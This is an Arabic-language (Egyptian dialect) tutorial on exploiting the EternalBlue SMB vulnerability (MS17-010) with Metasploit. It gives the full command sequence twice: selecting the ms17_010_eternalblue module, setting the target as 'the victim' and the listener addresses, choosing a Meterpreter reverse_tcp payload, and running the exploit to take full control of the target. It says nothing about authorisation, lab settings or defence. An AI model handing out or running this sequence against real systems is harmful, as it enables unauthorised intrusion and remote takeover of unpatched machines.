# **استغلال الثغرات المعروفة زي EternalBlue (MS17-010) – ببساطة!**

## **📌 يعني إيه استغلال الثغرات المعروفة؟**

فيه ثغرات مشهورة جدًا بتتصنف تحت **الثغرات الحرجة (Critical Vulnerabilities)**، وبتكون **معروفة ومتاحة للعامة**، بمعنى إن أي حد يقدر يستغلها لو فهمها كويس.

💡 **EternalBlue (MS17-010)** واحدة من أخطر الثغرات المعروفة، واستخدمها هجوم **WannaCry** الشهير اللي ضرب آلاف الأجهزة في 2017. الثغرة بتستغل خطأ في **بروتوكول SMB** اللي بيستخدم في مشاركة الملفات بين الأجهزة على الشبكة.

---

## **🔥 خطوات استغلال ثغرة EternalBlue (MS17-010) في Metasploit**

### **🟢 1. تشغيل Metasploit Console**

📌 افتح الـ Metasploit بالأمر:

```bash
msfconsole
```

---

### **🟢 2. البحث عن الاستغلال المناسب**

📌 دور على استغلال الثغرة باستخدام:

```bash
search ms17_010
```

🔹 هيظهر لك الاستغلال المطلوب، غالبًا هيكون بالشكل ده:

```bash
exploit/windows/smb/ms17_010_eternalblue
```

---

### **🟢 3. اختيار استغلال EternalBlue**

📌 استخدم الاستغلال كده:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

---

### **🟢 4. ضبط الإعدادات (Set Options)**

📌 لازم تضبط **IP الضحية وIP جهازك** كالتالي:

```bash
set RHOSTS 192.168.1.100   # IP الضحية
set LHOST 192.168.1.50     # جهازك اللي هياخد الاتصال العكسي
set LPORT 4444             # البورت المستخدم
```

---

### **🟢 5. اختيار الـ Payload المناسب**

📌 ده الكود اللي هيتنفذ بعد الاختراق، هنستخدم **Meterpreter**:

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

---

### **🟢 6. تنفيذ الاستغلال! 🚀**

📌 شغل الاستغلال بالأمر ده:

```bash
exploit
```

🔹 **لو الثغرة نجحت، هيجيلك Session Meterpreter وتقدر تتحكم في جهاز الضحية بالكامل!** 🔥

---

## **💡 الخلاصة بالمصري:**

1️⃣ **الثغرات المعروفة زي EternalBlue (MS17-010) بتسمح لك تخترق الأجهزة بسهولة لو مش محدثة.**  
2️⃣ **Metasploit عنده استغلال جاهز للثغرة، فمش هتحتاج تكتب كود من الصفر.**  
3️⃣ **بتحدد الضحية (`set RHOSTS`) والجهاز اللي هيستقبل الاتصال العكسي (`set LHOST`).**  
4️⃣ **بتستخدم Payload زي Meterpreter عشان تتحكم في الجهاز بعد نجاح الاختراق.**  
5️⃣ **بتنفذ الهجوم بـ `exploit`، ولو الجهاز غير محمي، هتدخل عليه مباشرة!**

---

## **🛠️ الخطوات العملية لاستغلال EternalBlue في Metasploit**

✅ **1. تشغيل Metasploit:**

```bash
msfconsole
```

✅ **2. البحث عن الاستغلال:**

```bash
search ms17_010
```

✅ **3. اختيار الاستغلال المناسب:**

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

✅ **4. ضبط إعدادات الهدف:**

```bash
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
set LPORT 4444
```

✅ **5. اختيار الـ Payload:**

```bash
set PAYLOAD windows/meterpreter/reverse_tcp
```

✅ **6. تنفيذ الاستغلال:**

```bash
exploit
```

🎯 **لو الجهاز مستهدف مصاب بالثغرة، هتدخل عليه مباشرة وتتحكم فيه!** 🔥